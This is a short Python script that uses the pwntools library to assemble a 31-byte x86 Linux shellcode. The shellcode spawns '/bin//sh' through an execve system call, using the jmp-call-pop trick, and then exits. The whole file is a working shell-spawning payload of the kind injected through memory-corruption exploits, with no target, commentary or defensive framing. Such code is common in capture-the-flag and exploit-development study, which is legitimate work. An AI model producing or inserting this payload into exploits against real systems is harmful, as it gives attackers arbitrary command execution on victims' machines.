#current length of shellcode is 31 bytes
from pwn import asm

sc='''
_start:
    jmp string
shellcode:
    pop ebx
    xor ecx,ecx
    mul ecx
    mov edx,eax
    mov al,0xb
    int 0x80
    xor eax,eax
    inc eax
    int 0x80 

string:
    call shellcode
    .string "/bin//sh"
'''
print (asm(sc))
